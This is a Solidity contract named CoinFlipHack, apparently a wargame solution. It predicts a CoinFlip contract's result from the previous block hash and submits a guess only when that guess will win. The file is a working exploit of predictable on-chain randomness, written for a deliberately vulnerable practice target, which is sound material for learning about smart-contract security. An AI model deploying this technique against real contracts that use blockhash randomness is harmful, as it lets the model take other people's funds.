// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "hardhat/console.sol";

interface CoinFlipInterface {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {

  using SafeMath for uint256;
  CoinFlipInterface CoinFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _CoinFlip) public {
    CoinFlip = CoinFlipInterface(_CoinFlip);
  }

  function hackFlip(bool _guess) public {
    // Get the current blockHash
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    //Only progress if guess is correct
    if (side != _guess) {
      console.log("Didn't guess correctly");
      return;
    }
    console.log("Guessed correctly");

    CoinFlip.flip(_guess); 
  }
}